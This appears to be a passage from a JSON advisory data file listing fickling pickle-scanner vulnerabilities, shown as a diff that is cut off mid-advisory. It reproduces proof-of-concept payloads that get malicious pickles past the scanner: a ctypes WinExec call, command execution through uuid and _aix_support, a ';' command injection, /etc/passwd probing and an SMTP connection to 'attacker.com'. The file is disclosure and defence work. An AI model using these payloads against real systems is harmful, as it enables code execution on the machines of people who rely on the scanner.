@@ -1,0 +1,1227 @@
+{
+  "schema_version": 1,
+  "package": "fickling",
+  "purls": [
+    "pkg:pypi/fickling"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 9,
+  "advisories": [
+    {
+      "id": "GHSA-565g-hwwr-4pp3",
+      "primary_id": "CVE-2025-67747",
+      "aliases": [
+        "CVE-2025-67747"
+      ],
+      "cve_ids": [
+        "CVE-2025-67747"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has missing detection for marshal.loads and types.FunctionType in unsafe modules list",
+      "details": "## Fickling Assessment\n\nBased on the test case provided in the original report below, this bypass was caused by `marshal` and `types` missing from the block list of unsafe module imports, Fickling started blocking both modules to address this issue. This was fixed in https://github.com/trailofbits/fickling/pull/186. The crash is unrelated and has no security impact\u2014it will be addressed separately.\n\n## Original report\n\n### Summary\nThere's missing detection for the python modules, `marshal.loads` and `types.FunctionType` and Fickling throws unhandled ValueErrors when the stack is deliberately exhausted.\n\n### Details\nFickling simply doesn't have the aforementioned modules in its list of unsafe imports and therefore it fails to get detected.\n\n### PoC\nThe following is a disassembled view of a malicious pickle file that uses these modules:\n```\n    0: \\x80 PROTO      4\n    2: \\x95 FRAME      0\n   11: \\x8c SHORT_BINUNICODE 'marshal'\n   20: \\x8c SHORT_BINUNICODE 'loads'\n   27: \\x93 STACK_GLOBAL\n   28: \\x94 MEMOIZE    (as 0)\n   29: h    BINGET     0\n   31: C    SHORT_BINBYTES b'\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf30\\x00\\x00\\x00\\x95\\x00S\\x00S\\x01K\\x00r\\x00\\\\\\x00R\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\\x00S\\x025\\x01\\x00\\x00\\x00\\x00\\x00\\x00 \\x00g\\x01)\\x03\\xe9\\x00\\x00\\x00\\x00N\\xda\\x02id)\\x02\\xda\\x02os\\xda\\x06system\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xda\\x08<string>\\xda\\x08<module>r\\t\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x13\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xe3\\x00\\t\\xd8\\x00\\x02\\x87\\t\\x82\\t\\x88$\\x85\\x0fr\\x07\\x00\\x00\\x00'\n  198: \\x85 TUPLE1\n  199: R    REDUCE\n  200: \\x94 MEMOIZE    (as 1)\n  201: \\x8c SHORT_BINUNICODE 'types'\n  208: \\x8c SHORT_BINUNICODE 'FunctionType'\n  222: \\x93 STACK_GLOBAL\n  223: \\x94 MEMOIZE    (as 2)\n  224: h    BINGET     2\n  226: h    BINGET     1\n  228: }    EMPTY_DICT\n  229: \\x86 TUPLE2\n  230: R    REDUCE\n  231: \\x94 MEMOIZE    (as 3)\n  232: h    BINGET     3\n  234: )    EMPTY_TUPLE\n  235: R    REDUCE\n  236: \\x94 MEMOIZE    (as 4)\n  237: \\x8c SHORT_BINUNICODE 'gottem'\n  245: b    BUILD\n  246: .    STOP\n ```\n\nWhen analyzing this modified file, safety_result.json shows:\n```\n{\n    \"severity\": \"LIKELY_SAFE\",\n    \"analysis\": \"Warning: Fickling failed to detect any overtly unsafe code,but the pickle file may still be unsafe.Do not unpickle this file if it is from an untrusted source!\\n\\n\",\n    \"detailed_results\": {}\n}\n```\n\nFurthermore, when we run `fickling -s <path_to_malicious_file>`, we also encounter this error:\n```\nTraceback (most recent call last):\n  File \"<path>/fickling\", line 7, in <module>\n    sys.exit(main())\n             ^^^^^^\n  File \"<path>/fickling/cli.py\", line 163, in main\n    safety_results = check_safety(pickled, json_output_path=json_output_path)\n                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/analysis.py\", line 408, in check_safety\n    results = analyzer.analyze(pickled)\n              ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/analysis.py\", line 65, in analyze\n    context.analyze(a)\n  File \"<path>/fickling/analysis.py\", line 31, in analyze\n    results = list(analysis.analyze(self))\n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/analysis.py\", line 196, in analyze\n    for node in context.pickled.non_standard_imports():\n                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/fickle.py\", line 826, in non_standard_imports\n    for node in self.properties.imports:\n                ^^^^^^^^^^^^^^^\n  File \"<path>/fickling/fickle.py\", line 777, in properties\n    self._properties.visit(self.ast)\n                           ^^^^^^^^\n  File \"<path>/fickling/fickle.py\", line 833, in ast\n    self._ast = Interpreter.interpret(self)\n                ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/fickle.py\", line 1001, in interpret\n    return Interpreter(pickled).to_ast()\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"<path>/fickling/fickle.py\", line 927, in to_ast\n    self.run()\n  File \"<path>/fickling/fickle.py\", line 971, in run\n    self.step()\n  File \"<path>/fickling/fickle.py\", line 989, in step\n    opcode.run(self)\n  File \"<path>/fickling/fickle.py\", line 1767, in run\n    raise ValueError(\"Exhausted the stack while searching for a MarkObject!\")\nValueError: Exhausted the stack while searching for a MarkObject!\n```\n\n### Impact\nThis allows an attacker to craft a malicious pickle file that can bypass fickling since it misses detections for `types.FunctionType` and `marshal.loads`. A user who deserializes such a file, believing it to be safe, would inadvertently execute arbitrary code on their system. This impacts any user or system that uses Fickling to vet pickle files for security issues.",
+      "published": "2025-12-15T23:35:55Z",
+      "modified": "2025-12-20T03:06:18.986345Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-67747"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/186"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/4e34561301bda1450268d1d7b0b2b151de33b913"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.6"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-565g-hwwr-4pp3",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5"
+      ]
+    },
+    {
+      "id": "GHSA-5cxw-w2xg-2m8h",
+      "primary_id": "GHSA-5cxw-w2xg-2m8h",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "fickling's `platform` module subprocess invocation evades `check_safety()` with `LIKELY_SAFE`",
+      "details": "# Our assessment\n\nWe added `platform` to the blocklist of unsafe modules (https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975). \n\nIt was not possible to inject extra arguments to `file` without first monkey-patching `platform._follow_symlinks` with the pickle, as it always returns an absolute path. We independently hardened it with https://github.com/trailofbits/fickling/commit/b9e690c5a57ee9cd341de947fc6151959f4ae359 to reduce the risk of obtaining direct module references while evading detection.\n\nhttps://github.com/python/cpython/blob/6d1e9ceed3e70ebc39953f5ad4f20702ffa32119/Lib/platform.py#L687-L695\n```python\ntarget = _follow_symlinks(target)\n# \"file\" output is locale dependent: force the usage of the C locale\n# to get deterministic behavior.\nenv = dict(os.environ, LC_ALL='C')\ntry:\n    # -b: do not prepend filenames to output lines (brief mode)\n    output = subprocess.check_output(['file', '-b', target],\n                                     stderr=subprocess.DEVNULL,\n                                     env=env)\n```\n\n# Original report\n\n## Summary\nA crafted pickle invoking `platform._syscmd_file`, `platform.architecture`, or `platform.libc_ver` passes `check_safety()` with `Severity.LIKELY_SAFE` and zero findings. During `fickling.loads()`, these functions invoke `subprocess.check_output` with attacker-controlled arguments or read arbitrary files from disk.\n\n**Clarification:** The subprocess call uses a list argument (`['file', '-b', target]`), not `shell=True`, so the attacker controls the file path argument to the `file` command, not the command itself. The impact is subprocess invocation with attacker-controlled arguments and information disclosure (file type probing), not arbitrary command injection.\n\n## Affected versions\n`<= 0.1.9` (verified on upstream HEAD as of 2026-03-04)\n\n## Non-duplication check against published Fickling GHSAs\nNo published advisory covers `platform` module false-negative bypass. This follows the same structural pattern as GHSA-5hwf-rc88-82xm (missing modules in `UNSAFE_IMPORTS`) but covers a distinct set of functions.\n\n## Root cause\n1. `platform` not in `UNSAFE_IMPORTS` denylist.\n2. `OvertlyBadEvals` skips calls imported from stdlib modules.\n3. `UnusedVariables` heuristic neutralized by making call result appear used (`SETITEMS` path).\n\n## Reproduction (clean upstream)\n```python\nfrom unittest.mock import patch\nimport fickling\nimport fickling.fickle as op\nfrom fickling.fickle import Pickled\nfrom fickling.analysis import check_safety\n\npickled = Pickled([\n    op.Proto.create(4),\n    op.ShortBinUnicode('platform'),\n    op.ShortBinUnicode('_syscmd_file'),\n    op.StackGlobal(),\n    op.ShortBinUnicode('/etc/passwd'),\n    op.TupleOne(),\n    op.Reduce(),\n    op.Memoize(),\n    op.EmptyDict(),\n    op.ShortBinUnicode('init'),\n    op.ShortBinUnicode('x'),\n    op.SetItem(),\n    op.Mark(),\n    op.ShortBinUnicode('trace'),\n    op.BinGet(0),\n    op.SetItems(),\n    op.Stop(),\n])\n\nresults = check_safety(pickled)\nprint(results.severity.name, len(results.results))  # LIKELY_SAFE 0\n\nwith patch('subprocess.check_output', return_value=b'ASCII text') as mock_sub:\n    fickling.loads(pickled.dumps())\n    print('subprocess called?', mock_sub.called)       # True\n    print('args:', mock_sub.call_args[0])               # (['file', '-b', '/etc/passwd'],)\n```\n\nAdditional affected functions (same pattern):\n- `platform.architecture('/etc/passwd')` \u2014 calls `_syscmd_file` internally\n- `platform.libc_ver('/etc/passwd')` \u2014 opens and reads arbitrary file contents\n\n## Minimal patch diff\n```diff\n--- a/fickling/fickle.py\n+++ b/fickling/fickle.py\n@@\n+        \"platform\",\n```\n\n## Validation after patch\n- Same PoC flips to `LIKELY_OVERTLY_MALICIOUS`\n- `fickling.loads` raises `UnsafeFileError`\n- `subprocess.check_output` is not called\n\n## Impact\n- **False-negative verdict:** `check_safety()` returns `LIKELY_SAFE` with zero findings for a pickle that invokes a subprocess with attacker-controlled arguments.\n- **Subprocess invocation:** `platform._syscmd_file` calls `subprocess.check_output(['file', '-b', target])` where `target` is attacker-controlled. The `file` command reads file headers and returns type information, enabling file existence and type probing.\n- **File read:** `platform.libc_ver` opens and reads chunks of an attacker-specified file path.",
+      "published": "2026-03-13T20:58:10Z",
+      "modified": "2026-03-14T09:18:21.040307Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-5cxw-w2xg-2m8h"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/351ed4d4242b447c0ffd550bb66b40695f3f9975"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.10"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5cxw-w2xg-2m8h",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.10"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9"
+      ]
+    },
+    {
+      "id": "GHSA-5hvc-6wx8-mvv4",
+      "primary_id": "CVE-2026-22608",
+      "aliases": [
+        "CVE-2026-22608"
+      ],
+      "cve_ids": [
+        "CVE-2026-22608"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling vulnerable to use of ctypes and pydoc gadget chain to bypass detection",
+      "details": "# Fickling's assessment\n\n`pydoc` and `ctypes` were added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1).\n\n# Original report\n\n### Summary\nBoth ctypes and pydoc modules arent explictly blocked. Even other existing pickle scanning tools (like picklescan) do not block pydoc.locate. Chaining these two together can achieve RCE while the scanner still reports the file as LIKELY_SAFE\n\n### Details\nImport: GLOBAL pydoc locate (Allowed).\nResolution: Call locate('ctypes.windll.kernel32.WinExec').\nExecution: Call the result with (b'calc.exe', 1).\n\nTo bypass the unused variable check an exception object is used, on the assumption that Exception would not be blocked in the future as it is a benign builtin\n\n### PoC\n```python\nimport os\n\nGLOBAL      = b'c'\nSTRING      = b'S'\nBININT      = b'K'\nTUPLE1      = b'\\x85'\nTUPLE2      = b'\\x86'\nEMPTY_TUPLE = b')'\nREDUCE      = b'R'\nPUT         = b'p'\nGET         = b'g'\nPOP         = b'0'\nEMPTY_DICT  = b'}'\nSETITEM     = b's'\nBUILD       = b'b'\nSTOP        = b'.'\n\ndef generate_stealth_payload():\n    payload = b\"\"\n\n    payload += GLOBAL + b\"pydoc\\nlocate\\n\"\n    payload += STRING + b\"'ctypes.windll.kernel32.WinExec'\\n\"\n    payload += TUPLE1 + REDUCE\n    payload += PUT + b\"0\\n\" # Var 0 = <_FuncPtr WinExec>\n    payload += POP\n\n    payload += GET + b\"0\\n\" \n    payload += b\"C\" + b\"\\x08\" + b\"calc.exe\" \n    payload += BININT + b\"\\x01\"             \n    payload += TUPLE2 + REDUCE\n    payload += PUT + b\"1\\n\" # Var 1 = Execution Result\n    payload += POP\n\n    payload += GLOBAL + b\"builtins\\nException\\n\"\n    payload += EMPTY_TUPLE + REDUCE\n    payload += PUT + b\"2\\n\" # Var 2 = Exception instance\n\n    payload += EMPTY_DICT\n    payload += STRING + b\"'rce_status'\\n\"\n    payload += GET + b\"1\\n\"\n    payload += SETITEM      # { 'rce_status': result }\n    \n    payload += BUILD \n    \n    payload += STOP\n    return payload\n\ndata = generate_stealth_payload()\nwith open(\"stealth_ctypes.pkl\", \"wb\") as f:\n    f.write(data)\n    \nprint(\"Generated 'stealth_ctypes.pkl'\")\n````\n\nWhat fickling sees\n```python\nfrom pydoc import locate\n_var0 = locate('ctypes.windll.kernel32.WinExec')\n_var1 = _var0(b'calc.exe', 1)\n_var2 = Exception()\n_var3 = _var2\n_var3.__setstate__({'rce_status': _var1})\nresult0 = _var3\n```\n<img width=\"915\" height=\"197\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b5d81e0d-4946-4768-a704-618a4554ae7a\" />",
+      "published": "2026-01-09T21:05:13Z",
+      "modified": "2026-02-03T03:03:30.124916Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-5hvc-6wx8-mvv4"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22608"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/195"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/b793563e60a5e039c5837b09d7f4f6b92e6040d1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/d0b00d584afb5c58e38991cd544cb3889de90db6"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L145"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5hvc-6wx8-mvv4",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ]
+    },
+    {
+      "id": "GHSA-5hwf-rc88-82xm",
+      "primary_id": "GHSA-5hwf-rc88-82xm",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling missing RCE-capable modules in UNSAFE_IMPORTS",
+      "details": "# Assessment\n\nThe modules `uuid`, `_osx_support` and `_aix_support` were added to the blocklist of unsafe imports (https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b).\n\n# Original report\n\n## Summary\n\nfickling's `UNSAFE_IMPORTS` blocklist is missing at least 3 stdlib modules that provide direct arbitrary command execution: `uuid`, `_osx_support`, and `_aix_support`. These modules contain functions that internally call `subprocess.Popen()` or `os.system()` with attacker-controlled arguments. A malicious pickle file importing these modules passes both `UnsafeImports` and `NonStandardImports` checks.\n\n\n## Affected Versions\n\n- fickling <= 0.1.8 (all versions)\n\n## Details\n\n### Missing Modules\n\nfickling's `UNSAFE_IMPORTS` (86 modules) does not include:\n\n| Module | RCE Function | Internal Mechanism | Importable On |\n|--------|-------------|-------------------|---------------|\n| `uuid` | `_get_command_stdout(cmd, *args)` | `subprocess.Popen((cmd,) + args, stdout=PIPE, stderr=DEVNULL)` | All platforms |\n| `_osx_support` | `_read_output(cmdstring)` | `os.system(cmd)` via temp file | All platforms |\n| `_osx_support` | `_find_build_tool(toolname)` | Command injection via `%s` in `_read_output(\"/usr/bin/xcrun -find %s\" % toolname)` | All platforms |\n| `_aix_support` | `_read_cmd_output(cmdstring)` | `os.system(cmd)` via temp file | All platforms |\n\n**Critical note:** Despite the names `_osx_support` and `_aix_support` suggesting platform-specific modules, they are importable on ALL platforms. Python includes them in the standard distribution regardless of OS.\n\n### Why These Pass fickling\n\n1. **`NonStandardImports`**: These are stdlib modules, so `is_std_module()` returns True \u2192 not flagged\n2. **`UnsafeImports`**: Module names not in `UNSAFE_IMPORTS` \u2192 not flagged\n3. **`OvertlyBadEvals`**: Function names added to `likely_safe_imports` (stdlib) \u2192 skipped\n4. **`UnusedVariables`**: Defeated by BUILD opcode (purposely unhardend)\n\n### Proof of Concept (using fickling's opcode API)\n\n```python\nfrom fickling.fickle import (\n    Pickled, Proto, Frame, ShortBinUnicode, StackGlobal,\n    TupleOne, TupleTwo, Reduce, EmptyDict, SetItem, Build, Stop,\n)\nfrom fickling.analysis import check_safety\nimport struct, pickle\n\nframe_data = b\"\\x95\" + struct.pack(\"<Q\", 60)\n\n# uuid._get_command_stdout \u2014 works on ALL platforms\nuuid_payload = Pickled([\n    Proto(4),\n    Frame(struct.pack(\"<Q\", 60), data=frame_data),\n    ShortBinUnicode(\"uuid\"),\n    ShortBinUnicode(\"_get_command_stdout\"),\n    StackGlobal(),\n    ShortBinUnicode(\"echo\"),\n    ShortBinUnicode(\"PROOF_OF_CONCEPT\"),\n    TupleTwo(),\n    Reduce(),\n    EmptyDict(), ShortBinUnicode(\"x\"), ShortBinUnicode(\"y\"), SetItem(),\n    Build(),\n    Stop(),\n])\n\n# _aix_support._read_cmd_output \u2014 works on ALL platforms\naix_payload = Pickled([\n    Proto(4),\n    Frame(struct.pack(\"<Q\", 60), data=frame_data),\n    ShortBinUnicode(\"_aix_support\"),\n    ShortBinUnicode(\"_read_cmd_output\"),\n    StackGlobal(),\n    ShortBinUnicode(\"echo PROOF_OF_CONCEPT\"),\n    TupleOne(),\n    Reduce(),\n    EmptyDict(), ShortBinUnicode(\"x\"), ShortBinUnicode(\"y\"), SetItem(),\n    Build(),\n    Stop(),\n])\n\n# _osx_support._find_build_tool \u2014 command injection via %s\nosx_payload = Pickled([\n    Proto(4),\n    Frame(struct.pack(\"<Q\", 60), data=frame_data),\n    ShortBinUnicode(\"_osx_support\"),\n    ShortBinUnicode(\"_find_build_tool\"),\n    StackGlobal(),\n    ShortBinUnicode(\"x; echo INJECTED #\"),\n    TupleOne(),\n    Reduce(),\n    EmptyDict(), ShortBinUnicode(\"x\"), ShortBinUnicode(\"y\"), SetItem(),\n    Build(),\n    Stop(),\n])\n\n# All three: fickling reports LIKELY_SAFE\nfor name, p in [(\"uuid\", uuid_payload), (\"aix\", aix_payload), (\"osx\", osx_payload)]:\n    result = check_safety(p)\n    print(f\"{name}: severity={result.severity}, issues={len(result.results)}\")\n    # Output: severity=Severity.LIKELY_SAFE, issues=0\n\n# All three: pickle.loads() executes the command\npickle.loads(uuid_payload.dumps())  # prints PROOF_OF_CONCEPT\n```\n\n### Verified Output\n\n```\n$ python3 poc.py\nuuid: severity=Severity.LIKELY_SAFE, issues=0\naix: severity=Severity.LIKELY_SAFE, issues=0\nosx: severity=Severity.LIKELY_SAFE, issues=0\nPROOF_OF_CONCEPT\n```\n\n## Impact\n\nAn attacker can craft a pickle file that executes arbitrary system commands while fickling reports it as `LIKELY_SAFE`. This affects any system relying on fickling for pickle safety validation, including ML model loading pipelines.\n\n## Suggested Fix\n\nAdd to `UNSAFE_IMPORTS` in fickling:\n```python\n\"uuid\",\n\"_osx_support\",\n\"_aix_support\",\n```\n\n**Longer term:** Consider an allowlist approach \u2014 only permit known-safe stdlib modules rather than blocking known-dangerous ones. The current 86-module blocklist still has gaps because the Python stdlib contains hundreds of modules.\n\n## Resources\n\n- Python source: `Lib/uuid.py` lines 156-168 (`_get_command_stdout`)\n- Python source: `Lib/_osx_support.py` lines 35-52 (`_read_output`), lines 54-68 (`_find_build_tool`)\n- Python source: `Lib/_aix_support.py` lines 14-30 (`_read_cmd_output`)\n- fickling source: `analysis.py` `UNSAFE_IMPORTS` set",
+      "published": "2026-03-04T21:31:03Z",
+      "modified": "2026-03-04T21:49:44.899883Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-5hwf-rc88-82xm"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/ffac3479dbb97a7a1592d85991888562d34dd05b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5hwf-rc88-82xm",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.9"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8"
+      ]
+    },
+    {
+      "id": "GHSA-83pf-v6qq-pwmr",
+      "primary_id": "GHSA-83pf-v6qq-pwmr",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has a detection bypass via stdlib network-protocol constructors",
+      "details": "# Our assessment\n\n`imtplib`, `imaplib`, `ftplib`, `poplib`, `telnetlib`, and `nntplib` were added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/6d20564d23acf14b42ec883908aed159be7b9ade). The `UnusedVariables` heuristic works as expected.\n\n# Original report \n\n## Summary\n\nFickling's `check_safety()` API and `--check-safety` CLI flag incorrectly rate as\n`LIKELY_SAFE` pickle files that open outbound TCP connections at deserialization time\nusing stdlib network-protocol constructors: `smtplib.SMTP`, `imaplib.IMAP4`,\n`ftplib.FTP`, `poplib.POP3`, `telnetlib.Telnet`, and `nntplib.NNTP`.\n\nThe bypass exploits two independent root causes described below.\n\n---\n\n## Root Cause 1: Incomplete blocklist (fixed in PR #233)\n\n`fickling/fickle.py` (lines 41-97) defines `UNSAFE_IMPORTS`, the primary blocklist.\n`fickling/analysis.py` (lines 229-248) defines the parallel\n`UnsafeImportsML.UNSAFE_MODULES` dict. Both omitted the following stdlib\nnetwork-protocol modules whose constructors open a TCP socket at instantiation time:\n\n| Module | Class | Default port | Constructor side-effect |\n|---|---|---|---|\n| `smtplib` | `SMTP` | 25 | TCP connect, reads SMTP banner, sends EHLO |\n| `imaplib` | `IMAP4` | 143 | TCP connect, reads IMAP capability banner |\n| `ftplib` | `FTP` | 21 | TCP connect, reads FTP welcome banner |\n| `poplib` | `POP3` | 110 | TCP connect, reads POP3 greeting |\n| `telnetlib` | `Telnet` | 23 | TCP connect |\n| `nntplib` | `NNTP` | 119 | TCP connect, NNTP handshake |\n\nBecause these module names were absent from both blocklists, `UnsafeImportsML`,\n`UnsafeImports`, and `NonStandardImports` all stayed silent. All six are genuine\nstdlib modules so `is_std_module()` returned `True` and `NonStandardImports` did\nnot fire.\n\n**Status: patched in PR #233.** The six modules have been added to `UNSAFE_IMPORTS`.\n\n---\n\n## Root Cause 2: Logic flaw in `unused_assignments()` at `fickle.py:1183` (unpatched)\n\n### Description\n\n`unused_assignments()` in `fickling/fickle.py` (lines 1174-1204) identifies variables\nthat are assigned but never referenced. `UnusedVariables` analysis calls this method\nand raises `SUSPICIOUS` for any unreferenced variable -- this would otherwise catch a\nbare `REDUCE` opcode that stores its result without using it.\n\nThe flaw is at line 1183. The method iterates over `module_body` statements and, when\nit encounters the final `result = <expr>` assignment, breaks out of the loop\nimmediately without first walking the right-hand side expression for `Name` references:\n\n```python\n# fickling/fickle.py:1183 (current code -- vulnerable)\nif (\n    len(statement.targets) == 1\n    and isinstance(statement.targets[0], ast.Name)\n    and statement.targets[0].id == \"result\"\n):\n    # this is the return value of the program\n    break   # exits WITHOUT scanning statement.value\n```\n\nAny variable that appears only in the RHS of `result = <expr>` is therefore never\nadded to the `used` set and is incorrectly classified as unused.\n\n### How this enables bypass suppression\n\nWhen fickling processes a `REDUCE` opcode in isolation, it generates:\n\n```python\n_var0 = SMTP('attacker.com', 25)\nresult = _var0\n```\n\nBecause the loop breaks before scanning `result = _var0`, `_var0` never enters\n`used`. `UnusedVariables` sees `_var0` as unused and raises `SUSPICIOUS`.\n\nAdding a `BUILD` opcode with an empty dict after the `REDUCE` changes the generated\nAST to:\n\n```python\nfrom smtplib import SMTP\n_var0 = SMTP('attacker.com', 25)   # dangerous call\n_var1 = _var0                      # BUILD step 1: intermediate reference\n_var1.__setstate__({})             # BUILD step 2: state call\nresult = _var1\n```\n\nNow `_var0` appears on the RHS of `_var1 = _var0`, a statement processed before 